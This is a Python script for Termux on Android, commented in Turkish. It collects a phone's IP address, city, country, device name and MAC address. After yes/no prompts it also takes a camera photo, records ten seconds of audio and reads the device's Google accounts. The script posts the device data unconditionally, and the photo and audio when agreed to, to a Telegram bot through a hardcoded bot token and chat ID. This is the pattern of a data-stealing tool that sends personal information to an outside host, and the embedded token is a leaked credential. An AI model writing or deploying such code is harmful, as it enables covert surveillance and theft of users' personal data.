import requests
import os
import platform
import uuid
import subprocess

# 📢 Telegram Bot Bilgileri
BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

# 📡 IP ve cihaz bilgileri
try:
    ip_response = requests.get("http://ip-api.com/json/", timeout=5)
    ip_data = ip_response.json()
    ip_address = ip_data.get("query", "Bilinmiyor")
    country = ip_data.get("country", "Bilinmiyor")
    city = ip_data.get("city", "Bilinmiyor")
except:
    ip_address, country, city = "Bağlantı hatası", "Bağlantı hatası", "Bağlantı hatası"

device_name = platform.node()
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])

# 📸 Fotoğraf çekme izni
photo_path = "/data/data/com.termux/files/home/photo.jpg"
take_photo = input("📸 Fotoğraf çekmek istiyor musunuz? (Y/N): ").strip().lower()
if take_photo == "y":
    try:
        subprocess.run(["termux-camera-photo", photo_path], check=True)
    except Exception as e:
        print(f"Hata: Fotoğraf çekilemedi - {e}")
        photo_path = None

# 🎤 MP3 formatında ses kaydı
audio_wav = "/data/data/com.termux/files/home/audio.wav"
audio_mp3 = "/data/data/com.termux/files/home/audio.mp3"

record_audio = input("🎤 10 saniyelik MP3 ses kaydı almak istiyor musunuz? (Y/N): ").strip().lower()
if record_audio == "y":
    try:
        subprocess.run(["termux-microphone-record", "-l", "10", audio_wav], check=True)
        subprocess.run(["lame", "--preset", "standard", audio_wav, audio_mp3], check=True)  # WAV → MP3 dönüşümü
        os.remove(audio_wav)  # WAV dosyasını sil
    except Exception as e:
        print(f"Hata: Ses kaydı alınamadı - {e}")
        audio_mp3 = None

# 📧 Gmail hesaplarını çekme
gmail_accounts = []
read_gmail = input("📧 Gmail hesaplarını almak istiyor musunuz? (Y/N): ").strip().lower()
if read_gmail == "y":
    try:
        output = subprocess.check_output(["termux-account"], stderr=subprocess.DEVNULL).decode().strip()
        gmail_accounts = output.split("\n") if output else []
    except:
        gmail_accounts = ["Erişim izni reddedildi veya desteklenmiyor"]

# 📩 Telegram’a gönderme
message = f"""
📡 **Bilgiler**
🌍 IP: {ip_address}
🇨🇺 Ülke: {country}
🏙️ Şehir: {city}
💻 Cihaz Adı: {device_name}
📡 MAC Adresi: {mac_address}

📧 **Gmail Hesapları**
{', '.join(gmail_accounts) if gmail_accounts else "Bulunamadı"}
"""

requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})

# Fotoğraf gönderme
if take_photo == "y" and photo_path and os.path.exists(photo_path):
    try:
        with open(photo_path, "rb") as photo_file:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files={"photo": photo_file}, data={"chat_id": CHAT_ID})
    except:
        print("⚠️ Fotoğraf gönderilemedi.")

# MP3 ses dosyası gönderme
if record_audio == "y" and audio_mp3 and os.path.exists(audio_mp3):
    try:
        with open(audio_mp3, "rb") as audio_file:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio", files={"audio": audio_file}, data={"chat_id": CHAT_ID})
    except:
        print("⚠️ MP3 ses kaydı gönderilemedi.")